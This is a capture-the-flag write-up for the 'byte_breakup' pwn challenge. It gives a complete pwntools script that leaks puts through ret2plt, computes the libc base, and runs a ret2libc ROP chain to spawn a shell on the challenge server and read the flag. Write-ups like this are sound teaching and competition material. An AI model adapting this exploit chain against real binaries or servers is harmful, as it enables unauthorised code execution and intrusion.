https://ctftime.org/event/2416

# byte_breakup (pwn)

Welcome to 'Byte Breakup,' where an old program is stuck in a code-cial relationship with a bug—the ex-girlfriend kind! She left a glitchy surprise, and now it's up to you to debug the drama away. Can you charm your way through its defenses and make it sing? Get ready for a byte-sized comedy of errors as you unravel the mysteries left by your digital ex!

nc 34.125.199.248 6969

## Solution

1) ret2plt
2) ret2libc

```python
#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./vuln_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 6969)

p.readuntil(b"password: \n")

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.rdi = elf.got["puts"]
rop.call(elf.plt["puts"])
rop.call(elf.sym["main"])
p.sendline(rop.chain())

p.readline()
p.readline()

leak = struct.unpack("<Q", p.read(6) + b"\x00\x00")[0]
libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

p.readuntil(b"password: \n")

rop = ROP(libc)
rop.rdx = 0
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.readline()
p.readline()

p.clean()

p.sendline(b"/bin/cat /home/flag.txt")

log.success(p.readline().decode()) # OSCTF{b1t_byt3_8r3akup}
```

## Flag
`OSCTF{b1t_byt3_8r3akup}`

smiley 2024/07/13
